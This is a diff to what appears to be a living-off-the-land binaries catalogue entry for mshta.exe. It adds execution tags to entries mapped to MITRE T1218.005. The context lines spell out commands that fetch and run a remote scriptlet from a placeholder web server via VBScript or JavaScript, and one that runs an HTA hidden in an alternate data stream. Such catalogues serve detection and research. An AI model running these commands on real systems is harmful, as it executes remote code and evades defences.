@@ -13,6 +13,8 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: WSH
+      - Execute: Remote
+      - Input: Custom Format
   - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))
     Description: Executes VBScript supplied as a command line argument.
     Usecase: Execute code
@@ -20,6 +22,8 @@ Commands:
     Privileges: User
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: VBScript
   - Command: mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();
     Description: Executes JavaScript supplied as a command line argument.
     Usecase: Execute code
@@ -27,6 +31,8 @@ Commands:
     Privileges: User
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: JScript
   - Command: mshta.exe "C:\ads\file.txt:file.hta"
     Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
     Usecase: Execute code hidden in alternate data stream
